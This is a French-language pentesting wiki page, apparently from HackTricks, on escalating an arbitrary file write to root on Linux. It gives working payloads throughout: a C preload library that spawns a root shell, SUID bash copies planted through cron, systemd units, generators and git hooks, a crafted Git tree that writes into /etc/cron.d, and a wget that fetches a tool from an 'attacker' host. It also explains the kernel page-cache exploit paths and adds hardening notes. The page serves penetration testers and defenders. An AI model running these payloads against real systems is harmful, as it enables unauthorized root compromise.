# Écriture arbitraire de fichier vers Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` est une liste à l'échelle du système d'objets partagés que le dynamic linker charge avant les autres objets partagés. Le mode d'exécution sécurisé applique des restrictions supplémentaires au preloading, donc un chemin de bibliothèque tel que `/tmp/pe.so` n'est pas une technique universelle pour les binaires SUID.\
Si vous pouvez créer ou modifier ce fichier, un processus qui le charge chargera la bibliothèque indiquée avant ses autres objets partagés, ce qui permet l'exécution de code dans le contexte de ce processus.<sup>[[12]](#references)</sup>

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

Les **Git hooks** sont des scripts exécutables lancés lors d’événements dans un repository, notamment pendant les opérations de commit et de merge. Si un **script ou utilisateur privilégié** effectue ces actions et qu’un attaquant peut **écrire dans le dossier `.git`**, le hook peut être utilisé pour une **élévation de privilèges**.<sup>[[13]](#references)</sup>

Par exemple, il est possible de **générer un script** dans un repository git, dans **`.git/hooks`**, afin qu’il soit toujours exécuté lorsqu’un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Traversal de chemin lors de l’export d’un arbre Git privilégié

Un synchroniseur privilégié peut éviter un `checkout` et énumérer à la place un repository contrôlé par un attaquant avec `git ls-tree`, lire chaque blob avec `git cat-file`, concaténer le chemin signalé avec un répertoire de staging, puis l’écrire lui-même. Cela devient une **écriture arbitraire de fichier avec les privilèges du synchroniseur** lorsqu’il combine `-c safe.directory=*` (désactivant la protection Git contre les repositories appartenant à un autre utilisateur) avec l’absence de vérification du confinement de la destination. Un nom d’entrée d’arbre absolu fait que `os.path.join(stage, name)` de Python ignore `stage` ; un nom relatif contenant `../` s’échappe lorsque le système de fichiers le résout. Comme l’application matérialise l’arbre brut au lieu de demander à Git de l’effectuer en `checkout`, le rejet des chemins lors du `checkout` ne protège jamais le point d’écriture.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Recherchez cette structure de code dans les services root, les timers, les agents de déploiement, les importateurs de templates et les tâches de sauvegarde/restauration :<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Une entrée d’arbre est encodée sous la forme `<mode> SP <name> NUL <raw object ID>`. L’option `git hash-object --literally` autorise délibérément des données d’objet que l’analyse normale ou `git fsck` pourraient rejeter ; un clone jetable peut donc construire un arbre dont le nom de fichier est une destination absolue. Cet exemple crée un blob de fichier cron, encapsule l’arbre élaboré dans un commit et déplace une branche vers celui-ci ; l’exploitation nécessite toutefois l’autorisation de mettre à jour un repository consommé par le job privilégié, ainsi qu’un serveur Git qui accepte l’objet malformé.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Le hardening doit couvrir à la fois l’ingestion du dépôt et l’opération finale sur le système de fichiers :<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Remplacez `safe.directory=*` par les dépôts exacts auxquels le service doit faire confiance, et exécutez le traitement des dépôts sans privilèges root lorsque c’est possible.
- Rejetez les noms absolus ainsi que tout composant `.` ou `..` avant la matérialisation. Après la jointure, canonisez le chemin et vérifiez que la destination reste sous la racine prévue.
- Évitez les conditions de course liées aux symlinks de type vérification puis ouverture : ouvrez relativement à un descripteur de répertoire approuvé et, sous Linux, utilisez `openat2()` avec `RESOLVE_BENEATH` et `RESOLVE_NO_SYMLINKS` pour les chemins contrôlés par l’attaquant.
- Préférez un checkout normal dans un répertoire isolé plutôt que de réimplémenter le checkout à partir de la sortie de plumbing. Si l’ingestion d’objets bruts est nécessaire, activez la validation côté réception, par exemple `receive.fsckObjects=true` ; n’abaissez pas les niveaux des alertes `receive.fsck.*` relatives aux chemins qui sont nécessaires pour rejeter les arbres forgés.

### Fichiers Cron et de temps

Si vous pouvez **écrire dans des fichiers liés à Cron que root exécute**, vous pouvez généralement obtenir une exécution de code lors du prochain lancement de la tâche. Les cibles intéressantes incluent :<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- La crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu’ils déclenchent

Vérifications rapides :
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Voies d’exploitation typiques :

- **Ajouter une nouvelle tâche cron root** à `/etc/crontab` ou dans un fichier de `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Backdoorer une cible de timer existante** en modifiant le script ou le binaire qu’elle lance

Exemple minimal de payload cron :
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si vous pouvez uniquement écrire dans un répertoire cron utilisé par `run-parts`, déposez-y plutôt un fichier exécutable :
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes :

- `run-parts` ignore généralement les noms de fichiers contenant des points ; préférez donc des noms comme `backup` plutôt que `backup.sh`.<sup>[[15]](#references)</sup>
- Certains systèmes utilisent des timers `systemd` au lieu du cron classique, mais l’idée d’abus reste la même : **modifier ce que root exécutera ultérieurement**.<sup>[[20]](#references)</sup>

### Fichiers de service et de socket

Si vous pouvez écrire dans des **fichiers d’unité `systemd`** ou dans les fichiers référencés par ceux-ci, vous pouvez potentiellement obtenir une exécution de code en tant que root en rechargeant et en redémarrant l’unité, ou en attendant que le chemin d’activation du service/socket se déclenche.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Les cibles intéressantes incluent :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Les overrides drop-in dans `/etc/systemd/system/<unit>.d/*.conf`
- Les scripts/binaires de service référencés par `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Les chemins `EnvironmentFile=` inscriptibles chargés par un service root

Vérifications rapides :
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Chemins d’abus courants :

- **Overwrite `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Add a drop-in override** avec un `ExecStart=` malveillant et effacez d’abord l’ancien
- **Backdoor** le script/binaire déjà référencé par l’unité
- **Hijack a socket-activated service** en modifiant le fichier `.service` correspondant, qui démarre lorsque le socket reçoit une connexion

Exemple d’override malveillant :
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flux d’activation typique :
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si vous ne pouvez pas redémarrer vous-même les services, mais que vous pouvez modifier une unit activée par socket, il peut vous suffire **d’attendre une connexion client** pour déclencher l’exécution en tant que root du service backdooré.<sup>[[17]](#references)</sup>

### Répertoires des generators systemd

Les **system generators** sont des exécutables lancés par le system manager avant le chargement des unit files, à la fois lors du démarrage et des rechargements de configuration. Par conséquent, un accès en écriture à un répertoire de system-generator (ou à un executable generator existant) constitue une primitive directe d’exécution de code en tant que root, facile à manquer lorsqu’un audit vérifie uniquement les fichiers `*.service` et `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

L’ordre de recherche habituel est `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` et `/usr/lib/systemd/system-generators/` (certaines distributions exposent `/lib/systemd/system-generators/` via la fusion de `/usr`). Un exécutable portant le même nom dans un répertoire antérieur masque celui du répertoire suivant. Ne confondez pas ces **répertoires d’exécutables d’entrée** avec `/run/systemd/generator`, `/run/systemd/generator.early` et `/run/systemd/generator.late`, qui contiennent la sortie temporaire en unités produite par les generators.<sup>[[35]](#references)</sup>

Vérifications rapides :
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Un générateur nouvellement créé doit avoir son bit exécutable défini. Si la primitive d’écriture contrôle les octets, mais pas le mode, ciblez un générateur déjà exécutable ; le tronquer sur place préserve normalement ses métadonnées. Si le répertoire lui-même est accessible en écriture, créez une nouvelle entrée et marquez-la comme exécutable.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Déclencher `systemctl daemon-reload` sur le **system** manager nécessite une autorisation appropriée, mais cela réexécute tous les system generators ; sinon, attendez un reload privilégié, une opération de package ou un reboot. Les répertoires user-generator tels que `~/.config/systemd/user-generators/` s’exécutent sous le user manager et ne fournissent pas les privilèges root à eux seuls.<sup>[[35]](#references)</sup>

Pour le hardening et la chasse, vérifiez chaque composant du chemin et les ACL plutôt que les seuls bits de mode finaux, établissez une baseline des hashes et de la propriété des packages des generators, et déclenchez une alerte en cas de création, de renommage, de modification du contenu ou des permissions dans tous les répertoires d’entrée des system generators. La surveillance de l’écriture est importante, car un generator one-shot peut se supprimer après son exécution, tandis que l’arborescence des units générées sous `/run/systemd/generator*` est reconstruite lors du prochain reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Écraser un `php.ini` restrictif utilisé par un sandbox PHP privilégié

Certains daemons personnalisés valident le PHP fourni par l’utilisateur en exécutant `php` avec un **`php.ini` restrictif** (par exemple, `disable_functions=exec,system,...`). Si le code exécuté dans le sandbox dispose toujours d’une **primitive d’écriture** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **écraser cette configuration** pour lever les restrictions, puis soumettre un second payload qui s’exécute avec des privilèges élevés.<sup>[[2]](#references)</sup>

Flux typique :

1. Le premier payload écrase la configuration du sandbox.
2. Le second payload exécute du code maintenant que les fonctions dangereuses sont réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si le daemon s’exécute en tant que root (ou effectue des validations avec des chemins appartenant à root), la deuxième exécution fournit un contexte root. Il s’agit essentiellement d’une **élévation de privilèges via l’écrasement de la configuration** lorsque le runtime sandboxé peut toujours écrire des fichiers.

### binfmt_misc

`binfmt_misc` expose des enregistrements sous `/proc/sys/fs/binfmt_misc` ; chaque enregistrement associe un motif de type de fichier à un interpréteur. L’impact sur les privilèges dépend de l’utilisateur autorisé à modifier l’enregistrement et du processus qui exécute ensuite le fichier correspondant. Vérifiez donc ces conditions avant de considérer cela comme une voie d’élévation de privilèges.<sup>[[21]](#references)</sup>

### Écraser les gestionnaires de schéma (comme http: ou https:)

Les environnements de bureau utilisent des associations MIME et des entrées desktop pour choisir une application pour les schémas d’URI ; un attaquant capable d’écrire dans la configuration par utilisateur et les répertoires d’entrées desktop concernés peut rediriger ces schémas vers un launcher qu’il contrôle. En modifiant le fichier `$HOME/.config/mimeapps.list` afin d’associer les gestionnaires d’URL HTTP et HTTPS à un fichier malveillant (par exemple, `x-scheme-handler/http=evil.desktop` et `x-scheme-handler/https=evil.desktop`), un clic de l’utilisateur peut invoquer cette entrée desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root exécutant des scripts/binaires modifiables par l'utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n'importe quel binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :<sup>[[1]](#references)</sup>

- **Détecter l'exécution :** surveillez les processus avec pspy afin de repérer root invoquant des chemins contrôlés par l'utilisateur.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmer la possibilité d’écriture :** vérifier que le fichier cible et son répertoire sont tous deux détenus par votre utilisateur et accessibles en écriture.
- **Détourner la cible :** sauvegarder le binaire/script d’origine et déposer un payload qui crée un shell SUID (ou effectue toute autre action root), puis restaurer les permissions :
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclencher l’action privilégiée** (par exemple, en appuyant sur un bouton d’interface qui lance le helper). Lorsque root réexécute le chemin détourné, récupérez le shell avec les privilèges élevés via `./rootshell -p`.

### Modification de fichiers binaires privilégiés limitée au page cache

Certains bugs du kernel ne modifient pas le fichier **sur le disque**. À la place, ils permettent de modifier uniquement la copie située dans le **page cache** d’un fichier lisible. Si vous pouvez cibler un binaire **setuid** ou autrement **exécuté par root**, l’exécution suivante peut lancer des octets contrôlés par l’attaquant depuis la mémoire et permettre une escalade de privilèges, même si le hash du fichier sur le disque reste inchangé.<sup>[[3]](#references)[[4]](#references)</sup>

Il est utile de considérer cela comme une **primitive d’écriture de fichier limitée au runtime** :<sup>[[3]](#references)</sup>

- **Le disque reste propre** : l’inode et les octets sur le disque ne changent pas
- **La mémoire est modifiée** : les processus qui lisent ou exécutent la page mise en cache obtiennent le contenu modifié par l’attaquant
- **L’effet est temporaire** : la modification disparaît après un redémarrage ou l’éviction du cache

Cette primitive se situe entre l’**arbitrary file write** classique et les anciens bugs d’**abuse du page cache** tels que Dirty COW / Dirty Pipe :<sup>[[3]](#references)</sup>

- Dirty COW reposait sur une race condition
- Dirty Pipe était soumis à des contraintes concernant la position d’écriture
- Une primitive limitée au page cache peut être plus fiable si le chemin vulnérable permet des écritures directes dans les pages mises en cache et adossées à un fichier

#### Flux générique de privesc

1. Obtenir une primitive kernel permettant d’écrire dans des **pages du page cache adossées à un fichier**
2. L’utiliser contre un **binaire privilégié lisible** ou un autre fichier exécuté par root
3. Déclencher l’exécution **avant** que la page ne soit évincée du cache
4. Obtenir une exécution de code en tant que root alors que le fichier sur le disque semble toujours inchangé

Cibles typiques à forte valeur :

- Les binaires **setuid-root**
- Les helpers lancés par des **services root**
- Les binaires fréquemment exécutés depuis des **containers partageant le kernel/page cache de l’hôte**

#### Exemple de chemin AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) est un bon exemple de cette catégorie. Le chemin vulnérable se trouvait dans l’API userspace de cryptographie Linux (`AF_ALG` / `algif_aead`) :<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` peut déplacer des références vers des pages du page cache depuis un fichier lisible vers la scatterlist TX de cryptographie
- le chemin de déchiffrement `algif_aead` in-place réutilisait les buffers source et destination
- `authencesn` écrivait ensuite dans la région de tag de destination
- lorsque cette région référençait encore des pages adossées au fichier et issues de `splice()`, l’écriture s’effectuait dans le **page cache du fichier cible**

La technique intéressante n’est donc pas le CVE en lui-même, mais le pattern :

- **injecter des pages de cache adossées à un fichier dans un sous-système kernel**
- faire en sorte que le sous-système les **traite comme une sortie inscriptible**
- déclencher une petite écriture contrôlée en mémoire

Le PoC public utilisait des **écritures répétées de 4 octets** pour patcher `/usr/bin/su` en mémoire, puis l’exécutait.<sup>[[4]](#references)[[7]](#references)</sup>

#### Exemple de chemin ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) présente une autre variante du même pattern **page-cache-only write-to-root**, mais cette fois le récepteur est le **déchiffrement IPsec ESP** au lieu de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La technique importante est l’**étape de metadata laundering** :

- `splice()` place une **page du page cache en lecture seule et adossée à un fichier** dans un paquet ESP-in-UDP
- la mitigation originale de DirtyFrag marquait ce skb avec `SKBFL_SHARED_FRAG` afin que `esp_input()` **effectue une copie avant le déchiffrement**
- netfilter `TEE` duplique le paquet via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- le clone conserve la **même référence vers la page physique du page cache**, mais perd `SKBFL_SHARED_FRAG`
- `esp_input()` considère alors le clone comme sûr et exécute un déchiffrement **in-place `cbc(aes)`** sur la page adossée au fichier

La leçon pour le reviewer dépasse donc le CVE : si une mitigation dépend des **métadonnées du skb/de la page** pour décider si une opération doit d’abord effectuer une copie, tout **chemin de clonage/copie qui conserve la page sous-jacente mais supprime les métadonnées** peut rouvrir silencieusement la primitive d’écriture.

Flux d’exploitation typique :

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` pour obtenir **`CAP_NET_ADMIN` dans un network namespace privé**
2. activer loopback et installer une règle **netfilter `TEE`** dans `mangle/OUTPUT`
3. installer des SAs de transport XFRM ESP via `NETLINK_XFRM`
4. encoder chaque mot de 4 octets ciblé dans le champ `seq_hi` de la SA (technique de sélection de mot de DirtyFrag)
5. envoyer le paquet ESP-in-UDP issu de `splice()` afin que le **clone TEE** atteigne `esp_input()` et effectue le déchiffrement **in-place**
6. répéter jusqu’à ce que la copie dans le page cache de `/usr/bin/su` ou d’un autre exécutable privilégié contienne du code contrôlé par l’attaquant

Sur le plan opérationnel, l’impact est identique à celui de l’exemple `AF_ALG` : le fichier sur le disque reste propre, mais `execve()` utilise les **octets modifiés du page cache** et fournit un accès root.<sup>[[8]](#references)[[9]](#references)</sup>

Vérifications d’exposition utiles pour cette variante :
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La réduction à court terme de la surface d’attaque est également spécifique au chemin ici : la mise à niveau vers un kernel intégrant `48f6a5356a33` corrige le chemin de clonage, tandis que le blocage de l’autoload de `xt_TEE` supprime l’**étape de blanchiment des flags** et que le blocage de `esp4` / `esp6` supprime le **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposition et recherche

Si vous soupçonnez cette classe de bug, ne vous fiez pas uniquement aux contrôles d’intégrité du disque. Vérifiez également :
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Les valeurs de configuration ci-dessous distinguent une interface chargeable d’une interface intégrée au kernel ; les règles de compilation crypto associent `CONFIG_CRYPTO_USER_API_AEAD` à `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m` : `algif_aead` peut être chargé ou déchargé en tant que module
- `CONFIG_CRYPTO_USER_API_AEAD=y` : l’interface est intégrée au kernel
- les binaires setuid sont de bonnes cibles, car un patch limité au page cache peut suffire à transformer un foothold local en accès root

#### Réduction de la surface d’attaque pour le chemin `algif_aead`

Si l’interface vulnérable est fournie par un module chargeable :<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
S'il est compilé dans le kernel, certaines divulgations ont signalé le blocage du chemin init avec :<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ce type de mesure d’atténuation mérite également d’être retenu pour d’autres kernel LPEs : si l’exploitation dépend d’une interface optionnelle spécifique, la désactivation ou la mise sur liste noire de cette interface peut interrompre le chemin d’exploitation, même avant qu’une mise à niveau complète du kernel soit disponible.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – détournement d’un script exécuté par root dans un répertoire PaperCut accessible en écriture par un utilisateur](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable : FAQ sur Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgation Openwall oss-security concernant CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correctif Linux stable : crypto: algif_aead - retour au fonctionnement out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Avis Copy Fail — CVE-2026-31431](https://copy.fail/)
- [7] [Analyse technique de Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Dépôt / README de DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog : analyse et exploitation de la variante Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correctif Linux : net: skb: préservation de `SKBFL_SHARED_FRAG` dans `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ancienne mesure d’atténuation Linux : définir `SKBFL_SHARED_FRAG` pour les paquets UDP spliced (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Hooks Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — page de manuel Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentation du Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associations des applications MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spécification Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Spécification Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Langage Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto de Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001 : vulnérabilité du page cache AF_ALG du Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentation Git de `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentation Git de `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentation de configuration Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — page de manuel Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentation des generators systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering : mécanismes de persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
